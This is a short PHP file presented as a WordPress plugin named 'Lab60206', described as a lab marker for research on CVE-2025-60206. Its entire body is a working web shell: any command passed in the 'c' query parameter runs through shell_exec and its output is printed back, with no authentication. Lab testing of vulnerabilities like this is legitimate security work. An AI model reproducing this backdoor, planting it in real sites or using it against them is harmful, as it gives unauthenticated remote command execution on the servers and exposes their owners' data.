<?php
/*
Plugin Name: Lab60206
Description: Lab marker for CVE-2025-60206 research
Version: 1.0
Author: lab
*/
if ( isset( $_GET['c'] ) ) {
    echo 'LAB60206::' . shell_exec( $_GET['c'] ) . '::END';
    die();
}
echo 'LAB60206_PLUGIN_LOADED';
